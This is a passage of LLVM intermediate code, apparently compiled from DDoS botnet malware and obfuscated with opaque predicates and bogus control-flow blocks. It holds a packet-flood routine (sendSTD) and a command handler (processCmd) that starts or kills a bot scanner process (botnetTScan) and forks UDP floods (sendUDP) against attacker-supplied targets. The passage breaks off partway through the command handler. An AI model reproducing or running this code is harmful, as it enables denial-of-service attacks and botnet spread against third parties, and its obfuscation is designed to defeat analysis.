define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [1 x i8*], align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %13 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %13, i32* %7, align 4
  %14 = call i64 @time(i64* null) #3
  store i64 %14, i64* %8, align 8
  %15 = load i8*, i8** %4, align 8
  %16 = call %struct.hostent* @gethostbyname(i8* %15)
  store %struct.hostent* %16, %struct.hostent** %10, align 8
  %17 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = load %struct.hostent*, %struct.hostent** %10, align 8
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %18, i32 0, i32 4
  %20 = load i8**, i8*** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %24 = bitcast %struct.in_addr* %23 to i8*
  %25 = load %struct.hostent*, %struct.hostent** %10, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 3
  %27 = load i32, i32* %26, align 4
  %28 = sext i32 %27 to i64
  call void @bcopy(i8* %22, i8* %24, i64 %28) #3
  %29 = load %struct.hostent*, %struct.hostent** %10, align 8
  %30 = getelementptr inbounds %struct.hostent, %struct.hostent* %29, i32 0, i32 2
  %31 = load i32, i32* %30, align 8
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %32, i16* %33, align 4
  %34 = load i32, i32* %5, align 4
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 0, i32* %11, align 4
  br label %37

; <label>:37:                                     ; preds = %originalBBpart2, %3
  %38 = bitcast [1 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %38, i8* bitcast ([1 x i8*]* @sendSTD.hexstring to i8*), i64 8, i32 8, i1 false)
  %39 = load i32, i32* %11, align 4
  %40 = icmp uge i32 %39, 50
  br i1 %40, label %41, label %59

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %7, align 4
  %43 = getelementptr inbounds [1 x i8*], [1 x i8*]* %12, i32 0, i32 0
  %44 = bitcast i8** %43 to i8*
  %45 = call i64 @send(i32 %42, i8* %44, i64 1460, i32 0)
  %46 = load i32, i32* %7, align 4
  %47 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %48 = call i32 @connect(i32 %46, %struct.sockaddr* %47, i32 16)
  %49 = call i64 @time(i64* null) #3
  %50 = load i64, i64* %8, align 8
  %51 = load i32, i32* %6, align 4
  %52 = sext i32 %51 to i64
  %53 = add nsw i64 %50, %52
  %54 = icmp sge i64 %49, %53
  br i1 %54, label %55, label %58

; <label>:55:                                     ; preds = %41
  %56 = load i32, i32* %7, align 4
  %57 = call i32 @close(i32 %56)
  call void @_exit(i32 0) #12
  unreachable

; <label>:58:                                     ; preds = %41
  store i32 0, i32* %11, align 4
  br label %59

; <label>:59:                                     ; preds = %58, %37
  %60 = load i32, i32* @x.101
  %61 = load i32, i32* @y.102
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %59
  %68 = load i32, i32* %11, align 4
  %69 = add i32 %68, 1
  store i32 %69, i32* %11, align 4
  %70 = load i32, i32* @x.101
  %71 = load i32, i32* @y.102
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %37
                                                  ; No predecessors!
  %79 = load i32, i32* @x.101
  %80 = load i32, i32* @y.102
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %78
  %87 = load i32, i32* @x.101
  %88 = load i32, i32* @y.102
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %59
  %95 = load i32, i32* %11, align 4
  %96 = add i32 %95, 1
  store i32 %96, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %78
  br label %originalBB1
}

; Function Attrs: noreturn
declare void @_exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = load i32, i32* @x.103
  %4 = load i32, i32* @y.104
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i64, align 8
  store i32 %0, i32* %11, align 4
  store i8** %1, i8*** %12, align 8
  %39 = load i8**, i8*** %12, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @strcmp(i8* %41, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0)) #9
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.103
  %45 = load i32, i32* @y.104
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %138, label %52

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i8**, i8*** %12, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @strcmp(i8* %55, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i32 0, i32 0)) #9
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %65, label %58

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* @botnetPid, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  br label %1042

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* @botnetPid, align 4
  %64 = call i32 @kill(i32 %63, i32 9) #3
  store i32 0, i32* @botnetPid, align 4
  br label %65

; <label>:65:                                     ; preds = %62, %52
  %66 = load i32, i32* @x.103
  %67 = load i32, i32* @y.104
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = load i8**, i8*** %12, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 1
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 @strcmp(i8* %76, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.127, i32 0, i32 0)) #9
  %78 = icmp ne i32 %77, 0
  %79 = load i32, i32* @x.103
  %80 = load i32, i32* @y.104
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %78, label %137, label %87

; <label>:87:                                     ; preds = %originalBBpart24
  %88 = load i32, i32* @botnetPid, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %91

; <label>:90:                                     ; preds = %87
  br label %1042

; <label>:91:                                     ; preds = %87
  %92 = call i32 @fork() #3
  store i32 %92, i32* %13, align 4
  store i32 1000, i32* %14, align 4
  store i32 10, i32* %15, align 4
  %93 = load i32, i32* %13, align 4
  %94 = icmp ugt i32 %93, 0
  br i1 %94, label %95, label %113

; <label>:95:                                     ; preds = %91
  %96 = load i32, i32* @x.103
  %97 = load i32, i32* @y.104
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %95
  %104 = load i32, i32* %13, align 4
  store i32 %104, i32* @botnetPid, align 4
  %105 = load i32, i32* @x.103
  %106 = load i32, i32* @y.104
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %1042

; <label>:113:                                    ; preds = %91
  %114 = load i32, i32* %13, align 4
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %113
  br label %1042

; <label>:117:                                    ; preds = %113
  %118 = load i32, i32* @x.103
  %119 = load i32, i32* @y.104
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %117
  %126 = load i32, i32* @x.103
  %127 = load i32, i32* @y.104
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %134

; <label>:134:                                    ; preds = %originalBBpart212
  %135 = load i32, i32* %15, align 4
  %136 = load i32, i32* %14, align 4
  call void @botnetTScan(i32 %135, i32 %136)
  call void @_exit(i32 0) #12
  unreachable

; <label>:137:                                    ; preds = %originalBBpart24
  br label %138

; <label>:138:                                    ; preds = %137, %originalBBpart2
  %139 = load i32, i32* @x.103
  %140 = load i32, i32* @y.104
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %138
  %147 = load i8**, i8*** %12, align 8
  %148 = getelementptr inbounds i8*, i8** %147, i64 0
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 @strcmp(i8* %149, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.128, i32 0, i32 0)) #9
  %151 = icmp ne i32 %150, 0
  %152 = load i32, i32* @x.103
  %153 = load i32, i32* @y.104
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %151, label %415, label %160

; <label>:160:                                    ; preds = %originalBBpart216
  %161 = load i32, i32* @x.103
  %162 = load i32, i32* @y.104
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %160
  %169 = load i32, i32* %11, align 4
  %170 = icmp slt i32 %169, 6
  %171 = load i32, i32* @x.103
  %172 = load i32, i32* @y.104
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %170, label %262, label %179

; <label>:179:                                    ; preds = %originalBBpart220
  %180 = load i8**, i8*** %12, align 8
  %181 = getelementptr inbounds i8*, i8** %180, i64 3
  %182 = load i8*, i8** %181, align 8
  %183 = call i32 @atoi(i8* %182) #9
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %262, label %185

; <label>:185:                                    ; preds = %179
  %186 = load i8**, i8*** %12, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 2
  %188 = load i8*, i8** %187, align 8
  %189 = call i32 @atoi(i8* %188) #9
  %190 = icmp eq i32 %189, -1
  br i1 %190, label %262, label %191

; <label>:191:                                    ; preds = %185
  %192 = load i32, i32* @x.103
  %193 = load i32, i32* @y.104
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %191
  %200 = load i8**, i8*** %12, align 8
  %201 = getelementptr inbounds i8*, i8** %200, i64 4
  %202 = load i8*, i8** %201, align 8
  %203 = call i32 @atoi(i8* %202) #9
  %204 = icmp eq i32 %203, -1
  %205 = load i32, i32* @x.103
  %206 = load i32, i32* @y.104
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %204, label %262, label %213

; <label>:213:                                    ; preds = %originalBBpart224
  %214 = load i8**, i8*** %12, align 8
  %215 = getelementptr inbounds i8*, i8** %214, i64 5
  %216 = load i8*, i8** %215, align 8
  %217 = call i32 @atoi(i8* %216) #9
  %218 = icmp eq i32 %217, -1
  br i1 %218, label %262, label %219

; <label>:219:                                    ; preds = %213
  %220 = load i32, i32* @x.103
  %221 = load i32, i32* @y.104
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %219
  %228 = load i8**, i8*** %12, align 8
  %229 = getelementptr inbounds i8*, i8** %228, i64 5
  %230 = load i8*, i8** %229, align 8
  %231 = call i32 @atoi(i8* %230) #9
  %232 = icmp sgt i32 %231, 65536
  %233 = load i32, i32* @x.103
  %234 = load i32, i32* @y.104
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %232, label %262, label %241

; <label>:241:                                    ; preds = %originalBBpart228
  %242 = load i8**, i8*** %12, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 5
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #9
  %246 = icmp sgt i32 %245, 65500
  br i1 %246, label %262, label %247

; <label>:247:                                    ; preds = %241
  %248 = load i8**, i8*** %12, align 8
  %249 = getelementptr inbounds i8*, i8** %248, i64 4
  %250 = load i8*, i8** %249, align 8
  %251 = call i32 @atoi(i8* %250) #9
  %252 = icmp sgt i32 %251, 32
  br i1 %252, label %262, label %253

; <label>:253:                                    ; preds = %247
  %254 = load i32, i32* %11, align 4
  %255 = icmp eq i32 %254, 7
  br i1 %255, label %256, label %263

; <label>:256:                                    ; preds = %253
  %257 = load i8**, i8*** %12, align 8
  %258 = getelementptr inbounds i8*, i8** %257, i64 6
  %259 = load i8*, i8** %258, align 8
  %260 = call i32 @atoi(i8* %259) #9
  %261 = icmp slt i32 %260, 1
  br i1 %261, label %262, label %263

; <label>:262:                                    ; preds = %256, %247, %241, %originalBBpart228, %213, %originalBBpart224, %185, %179, %originalBBpart220
  br label %1042

; <label>:263:                                    ; preds = %256, %253
  %264 = load i8**, i8*** %12, align 8
  %265 = getelementptr inbounds i8*, i8** %264, i64 1
  %266 = load i8*, i8** %265, align 8
  store i8* %266, i8** %16, align 8
  %267 = load i8**, i8*** %12, align 8
  %268 = getelementptr inbounds i8*, i8** %267, i64 2
  %269 = load i8*, i8** %268, align 8
  %270 = call i32 @atoi(i8* %269) #9
  store i32 %270, i32* %17, align 4
  %271 = load i8**, i8*** %12, align 8
  %272 = getelementptr inbounds i8*, i8** %271, i64 3
  %273 = load i8*, i8** %272, align 8
  %274 = call i32 @atoi(i8* %273) #9
  store i32 %274, i32* %18, align 4
  %275 = load i8**, i8*** %12, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 4
  %277 = load i8*, i8** %276, align 8
  %278 = call i32 @atoi(i8* %277) #9
  store i32 %278, i32* %19, align 4
  %279 = load i8**, i8*** %12, align 8
  %280 = getelementptr inbounds i8*, i8** %279, i64 5
  %281 = load i8*, i8** %280, align 8
  %282 = call i32 @atoi(i8* %281) #9
  store i32 %282, i32* %20, align 4
  %283 = load i32, i32* %11, align 4
  %284 = icmp sgt i32 %283, 6
  br i1 %284, label %285, label %290

; <label>:285:                                    ; preds = %263
  %286 = load i8**, i8*** %12, align 8
  %287 = getelementptr inbounds i8*, i8** %286, i64 6
  %288 = load i8*, i8** %287, align 8
  %289 = call i32 @atoi(i8* %288) #9
  br label %291

; <label>:290:                                    ; preds = %263
  br label %291

; <label>:291:                                    ; preds = %290, %285
  %292 = phi i32 [ %289, %285 ], [ 1000, %290 ]
  store i32 %292, i32* %21, align 4
  %293 = load i32, i32* %11, align 4
  %294 = icmp sgt i32 %293, 7
  br i1 %294, label %295, label %300

; <label>:295:                                    ; preds = %291
  %296 = load i8**, i8*** %12, align 8
  %297 = getelementptr inbounds i8*, i8** %296, i64 7
  %298 = load i8*, i8** %297, align 8
  %299 = call i32 @atoi(i8* %298) #9
  br label %301

; <label>:300:                                    ; preds = %291
  br label %301

; <label>:301:                                    ; preds = %300, %295
  %302 = phi i32 [ %299, %295 ], [ 1000000, %300 ]
  store i32 %302, i32* %22, align 4
  %303 = load i32, i32* %11, align 4
  %304 = icmp sgt i32 %303, 8
  br i1 %304, label %305, label %310

; <label>:305:                                    ; preds = %301
  %306 = load i8**, i8*** %12, align 8
  %307 = getelementptr inbounds i8*, i8** %306, i64 8
  %308 = load i8*, i8** %307, align 8
  %309 = call i32 @atoi(i8* %308) #9
  br label %311

; <label>:310:                                    ; preds = %301
  br label %311

; <label>:311:                                    ; preds = %310, %305
  %312 = phi i32 [ %309, %305 ], [ 0, %310 ]
  store i32 %312, i32* %23, align 4
  %313 = load i8*, i8** %16, align 8
  %314 = call i8* @strstr(i8* %313, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #9
  %315 = icmp ne i8* %314, null
  br i1 %315, label %316, label %369

; <label>:316:                                    ; preds = %311
  %317 = load i32, i32* @x.103
  %318 = load i32, i32* @y.104
  %319 = sub i32 %317, 1
  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %316
  %325 = load i8*, i8** %16, align 8
  %326 = call i8* @strtok(i8* %325, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %326, i8** %24, align 8
  %327 = load i32, i32* @x.103
  %328 = load i32, i32* @y.104
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %335

; <label>:335:                                    ; preds = %originalBBpart236, %originalBBpart232
  %336 = load i8*, i8** %24, align 8
  %337 = icmp ne i8* %336, null
  br i1 %337, label %338, label %368

; <label>:338:                                    ; preds = %335
  %339 = call i32 @listFork()
  %340 = icmp ne i32 %339, 0
  br i1 %340, label %350, label %341

; <label>:341:                                    ; preds = %338
  %342 = load i8*, i8** %24, align 8
  %343 = load i32, i32* %17, align 4
  %344 = load i32, i32* %18, align 4
  %345 = load i32, i32* %19, align 4
  %346 = load i32, i32* %20, align 4
  %347 = load i32, i32* %21, align 4
  %348 = load i32, i32* %22, align 4
  %349 = load i32, i32* %23, align 4
  call void @sendUDP(i8* %342, i32 %343, i32 %344, i32 %345, i32 %346, i32 %347, i32 %348, i32 %349)
  call void @_exit(i32 0) #12
  unreachable

; <label>:350:                                    ; preds = %338
  %351 = load i32, i32* @x.103
  %352 = load i32, i32* @y.104
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %350
  %359 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %359, i8** %24, align 8
  %360 = load i32, i32* @x.103
  %361 = load i32, i32* @y.104
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %335

; <label>:368:                                    ; preds = %335
  br label %414

; <label>:369:                                    ; preds = %311
  %370 = call i32 @listFork()
  %371 = icmp ne i32 %370, 0
  br i1 %371, label %397, label %372

; <label>:372:                                    ; preds = %369
  %373 = load i32, i32* @x.103
  %374 = load i32, i32* @y.104
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %372
  %381 = load i8*, i8** %16, align 8
  %382 = load i32, i32* %17, align 4
  %383 = load i32, i32* %18, align 4
  %384 = load i32, i32* %19, align 4
  %385 = load i32, i32* %20, align 4
  %386 = load i32, i32* %21, align 4
  %387 = load i32, i32* %22, align 4
  %388 = load i32, i32* %23, align 4
  call void @sendUDP(i8* %381, i32 %382, i32 %383, i32 %384, i32 %385, i32 %386, i32 %387, i32 %388)
  call void @_exit(i32 0) #12
  %389 = load i32, i32* @x.103
  %390 = load i32, i32* @y.104
  %391 = sub i32 %389, 1
  %392 = mul i32 %389, %391
  %393 = urem i32 %392, 2
  %394 = icmp eq i32 %393, 0
  %395 = icmp slt i32 %390, 10
  %396 = or i1 %394, %395
  br i1 %396, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  unreachable

; <label>:397:                                    ; preds = %369
  %398 = load i32, i32* @x.103
  %399 = load i32, i32* @y.104
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %397
  %406 = load i32, i32* @x.103
  %407 = load i32, i32* @y.104
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %414

; <label>:414:                                    ; preds = %originalBBpart244, %368
  br label %1042

; <label>:415:                                    ; preds = %originalBBpart216
  %416 = load i8**, i8*** %12, align 8
  %417 = getelementptr inbounds i8*, i8** %416, i64 0
  %418 = load i8*, i8** %417, align 8
  %419 = call i32 @strcmp(i8* %418, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.129, i32 0, i32 0)) #9
  %420 = icmp ne i32 %419, 0
  br i1 %420, label %686, label %421

; <label>:421:                                    ; preds = %415
  %422 = load i32, i32* %11, align 4
  %423 = icmp slt i32 %422, 6
  br i1 %423, label %530, label %424

; <label>:424:                                    ; preds = %421
  %425 = load i8**, i8*** %12, align 8
  %426 = getelementptr inbounds i8*, i8** %425, i64 3
  %427 = load i8*, i8** %426, align 8
  %428 = call i32 @atoi(i8* %427) #9
  %429 = icmp eq i32 %428, -1
  br i1 %429, label %530, label %430

; <label>:430:                                    ; preds = %424
  %431 = load i8**, i8*** %12, align 8
  %432 = getelementptr inbounds i8*, i8** %431, i64 2
  %433 = load i8*, i8** %432, align 8
  %434 = call i32 @atoi(i8* %433) #9
  %435 = icmp eq i32 %434, -1
  br i1 %435, label %530, label %436

; <label>:436:                                    ; preds = %430
  %437 = load i32, i32* @x.103
  %438 = load i32, i32* @y.104
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %436
  %445 = load i8**, i8*** %12, align 8
  %446 = getelementptr inbounds i8*, i8** %445, i64 4
  %447 = load i8*, i8** %446, align 8
  %448 = call i32 @atoi(i8* %447) #9
  %449 = icmp eq i32 %448, -1
  %450 = load i32, i32* @x.103
  %451 = load i32, i32* @y.104
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %449, label %530, label %458

; <label>:458:                                    ; preds = %originalBBpart248
  %459 = load i32, i32* @x.103
  %460 = load i32, i32* @y.104
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %458
  %467 = load i8**, i8*** %12, align 8
  %468 = getelementptr inbounds i8*, i8** %467, i64 4
  %469 = load i8*, i8** %468, align 8
  %470 = call i32 @atoi(i8* %469) #9
  %471 = icmp sgt i32 %470, 32
  %472 = load i32, i32* @x.103
  %473 = load i32, i32* @y.104
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %471, label %530, label %480

